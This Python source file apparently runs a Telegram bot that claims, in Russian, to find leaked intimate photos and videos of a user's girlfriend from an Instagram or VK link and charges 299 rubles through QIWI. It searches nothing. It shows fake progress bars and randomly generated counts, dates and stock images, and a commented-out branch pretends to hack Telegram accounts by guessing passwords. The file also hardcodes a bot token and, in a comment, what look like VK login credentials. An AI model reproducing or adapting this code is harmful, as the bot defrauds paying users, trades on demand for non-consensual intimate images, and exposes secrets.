from pyrogram import Client, filters
from pyrogram.errors import FloodWait

from pyrogram.types import ChatPermissions
import pathlib

import time
from time import sleep
import random

import requests
import re
from bs4 import BeautifulSoup

from datetime import datetime, timedelta
import vk_api

from pyrogram.types import (ReplyKeyboardMarkup, InlineKeyboardMarkup, InlineKeyboardButton)
from pyrogram import types

directory = str(pathlib.Path(__file__).parent.absolute())

token = "1980093960:AAHw8_7dWV9cAAcHX7Rnaq4MqtyEbL0C-sU"
app = Client("my_bot", bot_token=token)

cost = 299

phone_number = ""
secret_token = ""
public_token = ""

def get_balance():
    balance = "https://edge.qiwi.com/funding-sources/v2/persons/"+phone_number+"/accounts"
    s = requests.Session()
    s.headers['authorization'] = 'Bearer ' + secret_token
    res = s.get(balance)

    rubAlias = [x for x in res.json()['accounts'] if x['alias'] == 'qw_wallet_rub']
    rubBalance = rubAlias[0]['balance']['amount']
    return rubBalance

def get_payment_info():
    start_date = (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")
    start_time = (datetime.now() - timedelta(days=1)).strftime("%H:%M:%S")
    start = start_date + 'T' + start_time + 'Z'
    expired_date = (datetime.now() + timedelta(days=1)).strftime("%Y-%m-%d")
    expired_time = (datetime.now() + timedelta(days=1)).strftime("%H:%M:%S")
    expired = expired_date + 'T' + expired_time + 'Z'

    payments = "https://edge.qiwi.com/payment-history/v1/persons/" + phone_number +"/payments?rows=50&operation=IN&sources[0]=QW_RUB&startDate="+start+"&endDate="+expired

    s = requests.Session()
    s.headers['authorization'] = 'Bearer ' + secret_token
    res = s.get(payments)
    return res.json()

def check_payment(object, user_id, sum):
    try:
        if int(object['data'][0]['sum']['amount']) <= int(sum):
            if str(object['data'][0]['comment']) == str(user_id):
                if object['data'][0]['statusText'] == 'Success':
                    return True
                else:
                    return False
            else:
                return False
        else:
            return False
    except IndexError:
        return False

def create_payment(sum, user_id):
    uri = "https://oplata.qiwi.com/create?publicKey=" + public_token + "&amount=" + str(sum) + "&comment=" + str(user_id)
    return uri

@app.on_callback_query()
def answer(_, callback_query):
    if callback_query.data == "check_payment":
        if check_payment(get_payment_info(), callback_query.from_user.id, cost) == True:
            callback_query.answer("💎 Оплачено!", show_alert=True)
            FileWriter = open(directory + '\\premiums.txt', 'w')
            FileWriter.write(str(callback_query.from_user.id) + '\n')
            FileWriter.close()
        else:
            callback_query.answer("❌ Не оплачено!", show_alert=True)

@app.on_message(filters.command("start", prefixes="/"))
def welcome(_, message):
    app.send_message(message.from_user.id, "Добро пожаловать <b>%s" % message.from_user.first_name + "!</b>\n\n<b>🤖 Я - бот, умею искать сливы твоих подруг или девушек</b>\n\n<i>Отправь мне ссылку на профиль (Instagram, VKontakte)</i>\n\n<b>Пример: </b> <code>https://instagram.com/username</code>\n", reply_markup=ReplyKeyboardMarkup(
            [
                ["⚡️ Получить VIP"],  # 1 row
                ["🔎 Искать по всему интернету"],
                ["❤️ Помощь"],  # 2 row
            ],
            resize_keyboard=True  # Make the keyboard smaller
        ), parse_mode="html")
    
    FileReader = open(directory + '\\users.txt', 'r')
    Users = FileReader.read()
    
    if Users.find(str(message.from_user.id)) == -1:
        FileWriter = open(directory + '\\users.txt', 'a+')
        FileWriter.write('\n' + str(message.from_user.id))
        FileWriter.close()
    
    FileReader.close()

    # app.send_message(message.from_user.id, create_payment(550, message.from_user.id))

@app.on_message(filters.text & ~filters.edited)
def purchase(_, message):
    FileReader = open(directory + '\\admin.txt', 'r')
    admin = FileReader.read()

    if str(message.text).find("vk.com/") != -1:
        Reader = open(directory + '\\accounts.txt', 'r')
        Acc = Reader.read()
        perc = 0
        nickname = str(message.text).split("vk.com/")[1]

        # instagram = requests.get(str(message.text))
        # soup = BeautifulSoup(instagram.text, "html.parser")
        # url = "https://vk.com/" + nickname
        # vk = requests.get(url)
        # soup = BeautifulSoup(vk.text, "lxml")
        # print(soup.find("img", class_="page_avatar_img"))
        # link = img.__getattribute__("src")
        #print(img['src'])


        # vk_session = vk_api.VkApi('+998937571204', 'gamehacker2019')
        # vk_session.auth()
        # vk = vk_session.get_api()
        # # Получить информацию о любом другом пользователе
        # user = vk.users.get(user_ids="saurux")

        # print(user)

        Reader = open(directory + '\\accounts.txt', 'r')
        Acc = Reader.read()
        perc = 0
        app.send_message(message.from_user.id, "⚙️ Начинаем поиск...")

        if not re.search(nickname, Acc):
            while(perc < 100):
                try:
                    text = "👮‍ Сбор данных аккаунта "+nickname+" | " + str(perc) + "%"
                    #message.edit(text)
                    app.edit_message_text(message.chat.id, message.message_id + 1, text)

                    perc += random.randint(1, 3)
                    sleep(0.1)

                except FloodWait as e:
                    sleep(e.x)
            
            sleep(0.75)

            app.edit_message_text(message.chat.id, message.message_id + 1, "⚡️ Поиск в базе данных...")

            sleep(1.25)
            perc = 0
            while(perc < 100):
                try:
                    text = "🚀 Идёт поиск в базе данных "+nickname+" | " + str(perc) + "%"
                    app.edit_message_text(message.chat.id, message.message_id + 1, text)

                    perc += random.randint(1, 4)
                    sleep(0.45)

                except FloodWait as e:
                    sleep(e.x)

            rand = random.randint(6, 11)
            text_custom = "x"
            i_ = 0
            while i_ <= rand:
                text_custom += "x"
                i_ += 1
            
            _id = str(random.randint(1023456,78923456))
            _picture = "trial/trial" + str(random.randint(1,9)) + ".png"
            _date = (datetime.now() - timedelta(days=random.randint(1,75))).strftime("%d.%m.%Y")
            _videos = str(random.randint(6,19))
            _photos   = str(random.randint(15,57))

            app.send_photo(message.chat.id, _picture)
            app.send_message(message.chat.id, "<b>Имя пользователя:</b> "+ nickname +" ✅\n<b>ID:</b> " + _id + " ✅\n<b>Дата слива:</b> " + _date + " ✅\n<b>Фотки:</b> " + _photos + " ✅" + " \n<b>Видео:</b> " + _videos + " ✅",
            reply_markup=InlineKeyboardMarkup(
            [
                [  # First row
                    InlineKeyboardButton(  # Opens a web URL
                        "🔑 Получить доступ - "+str(cost)+"₽",
                        url=create_payment(cost, message.from_user.id)
                    ),
                ],
            ]
        ),)

            Writer = open(directory + '\\accounts.txt', 'a+')
            Writer.write(str(nickname) + ":" + text_custom + ":" + _picture + ":" + _id + ":" + _date + ":" + _videos + ":" + _photos + "\n")
            Writer.close()
            Reader.close()
        else:
            Reader = open(directory + '\\accounts.txt', 'r')
            _account = Reader.read()
            app.send_message(message.from_user.id, "🟢 Данный аккаунт уже есть в базе данных!\n")
            _begin = _account.find(nickname)
            _end = _account[_begin:].split("\n")[0]
            _split = _end.split(":")
            _nickname = _split[0]
            _password = _split[1]
            _picture  = _split[2]
            _identificator = _split[3]
            _date = _split[4]
            _videos = _split[5]
            _photos = _split[6]

            app.send_photo(message.chat.id, _picture)
            app.send_message(message.chat.id, "<b>Имя пользователя:</b> "+ nickname +" ✅\n<b>ID:</b> " + _identificator + " ✅\n<b>Дата слива:</b> " + _date + " ✅\n<b>Фотки:</b> " + _photos + " ✅" + " \n<b>Видео:</b> " + _videos + " ✅",
            reply_markup=InlineKeyboardMarkup(
            [
                [  # First row
                    InlineKeyboardButton(  # Opens a web URL
                        "🔑 Получить доступ - "+str(cost)+"₽",
                        url=create_payment(cost, message.from_user.id)
                    ),
                ],
            ]))
            #print(_account.index(nickname, 0, 20))
            Reader.close()

    # Telegram
    # elif str(message.text).find("@") != -1:
    #     nickname = str(message.text).split("@")[1]
    #     try:
    #         avatar = app.get_profile_photos(nickname, limit=1)
    #         _path = app.download_media(avatar[0].file_id)

    #         Reader = open(directory + '\\accounts.txt', 'r')
    #         Acc = Reader.read()
    #         perc = 0
    #         app.send_message(message.from_user.id, "⚙️ Начинаем взлом...")

    #         if Acc.find(nickname) == -1:
    #             while(perc < 100):
    #                 try:
    #                     text = "👮‍ Сбор данных аккаунта "+nickname+" | " + str(perc) + "%"
    #                     #message.edit(text)
    #                     app.edit_message_text(message.chat.id, message.message_id + 1, text)

    #                     perc += random.randint(1, 3)
    #                     sleep(0.1)

    #                 except FloodWait as e:
    #                     sleep(e.x)
                
    #             sleep(0.75)

    #             app.edit_message_text(message.chat.id, message.message_id + 1, "📛 Собираем логи...")

    #             sleep(1.25)
    #             perc = 0
    #             while(perc < 100):
    #                 try:
    #                     text = "💮‍ Идёт подбор паролей к аккаунту "+nickname+" | " + str(perc) + "%"
    #                     app.edit_message_text(message.chat.id, message.message_id + 1, text)

    #                     perc += random.randint(1, 4)
    #                     sleep(0.45)

    #                 except FloodWait as e:
    #                     sleep(e.x)

    #             rand = random.randint(6, 11)
    #             text_custom = "x"
    #             i_ = 0
    #             while i_ <= rand:
    #                 text_custom += "x"
    #                 i_ += 1
                
    #             app.send_photo(message.chat.id, _path)

    #             app.send_message(message.chat.id, "🔴 Не удалось взломать аккаунт "+nickname+"!\nДата взлома: " + datetime.now().strftime("%Y-%m-%d") + " 📅\nВремя взлома: " + datetime.now().strftime("%H:%M:%S") + " ⏱\nАккаунт: "+nickname+"\n\n\nНо это не всё, вы можете приобрести пакет <b>«VIP»</b> и тем самым открыть полный функционал бота!",
    #             reply_markup=InlineKeyboardMarkup(
    #             [
    #                 [  # First row
    #                     InlineKeyboardButton(  # Opens a web URL
    #                         "🔑 Разблокировать - "+str(cost)+"₽",
    #                         url=create_payment(cost, message.from_user.id)
    #                     ),
    #                 ],
    #             ]
    #         ),)

    #             Writer = open(directory + '\\accounts.txt', 'a+')
    #             Writer.write(str(nickname) + ":" + text_custom + "\n")
    #             Writer.close()
    #         else:
    #             app.send_message(message.from_user.id, "🟢 Данный аккаунт уже есть в базе данных!\n")
    #     except:
    #         app.send_message(message.from_user.id, "🔴 Данный аккаунт не является валидным или не существует\n")

    # - instagram
    elif str(message.text).find("instagram.com/") != -1:
        nickname = str(message.text).split("instagram.com/")[1]

        Reader = open(directory + '\\accounts.txt', 'r')
        Acc = Reader.read()
        perc = 0
        app.send_message(message.from_user.id, "⚙️ Начинаем поиск...")

        if not re.search(nickname, Acc):
            while(perc < 100):
                try:
                    text = "👮‍ Сбор данных аккаунта "+nickname+" | " + str(perc) + "%"
                    #message.edit(text)
                    app.edit_message_text(message.chat.id, message.message_id + 1, text)

                    perc += random.randint(1, 3)
                    sleep(0.1)

                except FloodWait as e:
                    sleep(e.x)
            
            sleep(0.75)

            app.edit_message_text(message.chat.id, message.message_id + 1, "⚡️ Поиск в базе данных...")

            sleep(1.25)
            perc = 0
            while(perc < 100):
                try:
                    text = "🚀 Идёт поиск в базе данных "+nickname+" | " + str(perc) + "%"
                    app.edit_message_text(message.chat.id, message.message_id + 1, text)

                    perc += random.randint(1, 4)
                    sleep(0.45)

                except FloodWait as e:
                    sleep(e.x)

            rand = random.randint(6, 11)
            text_custom = "x"
            i_ = 0
            while i_ <= rand:
                text_custom += "x"
                i_ += 1
            
            _id = str(random.randint(1023456,78923456))
            _picture = "trial/trial" + str(random.randint(1,9)) + ".png"
            _date = (datetime.now() - timedelta(days=random.randint(1,75))).strftime("%d.%m.%Y")
            _videos = str(random.randint(6,19))
            _photos   = str(random.randint(15,57))

            app.send_photo(message.chat.id, _picture)
            app.send_message(message.chat.id, "<b>Имя пользователя:</b> "+ nickname +" ✅\n<b>ID:</b> " + _id + " ✅\n<b>Дата слива:</b> " + _date + " ✅\n<b>Фотки:</b> " + _photos + " ✅" + " \n<b>Видео:</b> " + _videos + " ✅",
            reply_markup=InlineKeyboardMarkup(
            [
                [  # First row
                    InlineKeyboardButton(  # Opens a web URL
                        "🔑 Получить доступ - "+str(cost)+"₽",
                        url=create_payment(cost, message.from_user.id)
                    ),
                ],
            ]
        ),)

            Writer = open(directory + '\\accounts.txt', 'a+')
            Writer.write(str(nickname) + ":" + text_custom + ":" + _picture + ":" + _id + ":" + _date + ":" + _videos + ":" + _photos + "\n")
            Writer.close()
            Reader.close()
        else:
            Reader = open(directory + '\\accounts.txt', 'r')
            _account = Reader.read()
            app.send_message(message.from_user.id, "🟢 Данный аккаунт уже есть в базе данных!\n")
            _begin = _account.find(nickname)
            _end = _account[_begin:].split("\n")[0]
            _split = _end.split(":")
            _nickname = _split[0]
            _password = _split[1]
            _picture  = _split[2]
            _identificator = _split[3]
            _date = _split[4]
            _videos = _split[5]
            _photos = _split[6]

            app.send_photo(message.chat.id, _picture)
            app.send_message(message.chat.id, "<b>Имя пользователя:</b> "+ nickname +" ✅\n<b>ID:</b> " + _identificator + " ✅\n<b>Дата слива:</b> " + _date + " ✅\n<b>Фотки:</b> " + _photos + " ✅" + " \n<b>Видео:</b> " + _videos + " ✅",
            reply_markup=InlineKeyboardMarkup(
            [
                [  # First row
                    InlineKeyboardButton(  # Opens a web URL
                        "🔑 Получить доступ - "+str(cost)+"₽",
                        url=create_payment(cost, message.from_user.id)
                    ),
                ],
            ]))
            #print(_account.index(nickname, 0, 20))
            Reader.close()


    elif message.text == "⚡️ Получить VIP":
        app.send_message(
        message.from_user.id,  # Edit this
        "Покупка Тарифа <b>«VIP»</b>\n\n❗️ После оплаты нажмите на кнопку «<b>Я оплатил</b>»!",
        reply_markup=InlineKeyboardMarkup(
            [
                [  # First row
                    InlineKeyboardButton(
                        "Оплатить - "+str(cost)+"₽",
                        url=create_payment(cost, message.from_user.id)
                    ),
                    InlineKeyboardButton(
                        "Я оплатил",
                        callback_data="check_payment"
                    ),
                ],
            ]
        ),
        parse_mode="html"
    )

    elif message.text == "🔎 Искать по всему интернету":
        app.send_message(message.from_user.id, "Для доступа к данному разделу приобретите пакет <b>«VIP»</b>", parse_mode="html")

    elif message.text == "❤️ Помощь":
        app.send_message(message.from_user.id, "⛑ Напишите любой интересующий вопрос, ответив на это сообщение!")

    elif message.from_user.id == int(admin):
        if message.has_key("reply_to_message"):
            if str(message.reply_to_message.text).find("Сообщение") != -1:
                arrStr = str(message.reply_to_message.text).split(": ")
                id = arrStr[1].split("\n\n")[0]
                app.send_message(int(id), message.text)

    try:
        if message.has_key("reply_to_message"):
            if message.reply_to_message.text == "⛑ Напишите любой интересующий вопрос, ответив на это сообщение!":
                app.send_message(str(admin), "Сообщение от пользователя: " + str(message.from_user.id) + "\n\nUsername: " + message.from_user.username + "\n\nИмя: " + message.from_user.first_name + "\n\nСообщение: " + message.text + "\n\nОтветь на это сообщение!")
    except IndexError:
        pass
    
    FileReader.close()



app.run()
